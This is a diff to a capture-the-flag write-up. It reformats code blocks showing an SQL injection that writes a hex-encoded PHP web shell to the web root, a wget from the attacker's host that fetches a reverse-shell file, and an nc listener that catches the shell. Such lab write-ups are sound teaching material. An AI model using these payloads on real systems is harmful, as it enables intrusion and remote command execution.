@@ -942,7 +942,9 @@ Now if we convert this into hex and then if we are able to get this x into a fil
 
 Final SQLi looks like this
 
-```' UNION SELECT NULL,0x3c3f7068702073797374656d28245f4745545b2278225d293b203f3e into outfile '/var/www/html/z.php'-- --```
+```
+' UNION SELECT NULL,0x3c3f7068702073797374656d28245f4745545b2278225d293b203f3e into outfile '/var/www/html/z.php'-- --
+```
 
 ![enum result](45.png)
 
@@ -950,15 +952,21 @@ Now we can run commands in it
 
 I will run python server in my system and get my pentest monkey reverse shell file into this
 
-```python -m http.server 3030```
+```
+python -m http.server 3030
+```
 
 In URL now after x= add this
 
-```wget http://tun0_IP:3030/shell.php5```
+```
+wget http://tun0_IP:3030/shell.php5
+```
 
 Now we have revshell.php file here so lets run that
 
-```nc -lvnp 1234```
+```
+nc -lvnp 1234
+```
 
 In browser change file name to revshell.php
 
@@ -966,7 +974,9 @@ In browser change file name to revshell.php
 
 Now we are inside the machine
 
-``` cat /home/dylan/user.txt ```
+``` 
+cat /home/dylan/user.txt
+```
 
 We see an access denied bcuz we are not dylan, we are www-data
 
